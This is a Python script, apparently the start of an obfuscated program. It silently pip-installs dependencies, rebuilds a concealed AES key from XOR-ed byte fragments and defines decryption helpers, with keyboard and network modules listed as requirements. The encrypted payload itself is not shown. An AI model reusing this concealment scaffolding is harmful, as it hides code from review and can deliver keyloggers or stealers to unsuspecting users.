
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['datetime', 'asyncio', 'hashlib', 'os', 're', 'ujson', 'httpx', 'base64', 'keyboard', 'dataclasses', 'ctypes', 'requests', 'subprocess', 'typing', 'rich']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b"\xcf\x94\x85\xbc\x12RC\x9b4\x18Sa\x10\xaf\x1cm\x1a'\x14mL\xba\xb1\x94Jd\xbcD-u\xe3I", b'\xe6\x8b\x8eom\x12K\x95\n\x84Yh\x97:\xfa\x97\xff6\xf3\xb2\xfa\x8d\xdb\xe9\xa6\x14Z)yHK-', b'\xba\xa6\xfa\xa3-\xad&1\xc3}i@Y\xae\x93C\xc0\xa6A\xb9\xb6v\x7f\x7f\xfd\xafT\x1aj(\xc3\xf6'])
_I = _xor([b'\x93]\xeeS#\xf3H\\\x91\xf4\xc1\x1f\x0b\xa6\xd6\xed', b'\xbd\x8e\x81#`\xbc\xf1\x9e\x8d\xcc\xbe\xcc6Yw\xab'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

